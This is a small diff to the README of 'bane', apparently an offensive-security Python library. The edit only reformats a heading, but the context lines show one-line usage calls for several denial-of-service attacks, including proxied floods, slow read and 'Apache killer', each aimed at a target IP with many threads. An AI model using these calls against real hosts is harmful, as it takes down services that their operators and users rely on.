@@ -133,7 +133,7 @@ II-Usage (General usage):
 <br>bane.prox_xerxes(IP, p= port , duration= 300 , threads=500 , timeout=5 )
 <h4>Slow read attack:</h4>
 <br>bane.slow_read(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
-<br><br>The below DDoS functions have been disabled and will be added again soon:<br><br>
+<h3>The below DDoS functions have been disabled and will be added again soon:</h3>
 <h4>Slow proxies flood:</h4>
 <br>bane.prox_slow(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
 <h4>Apache killer attack:</h4>
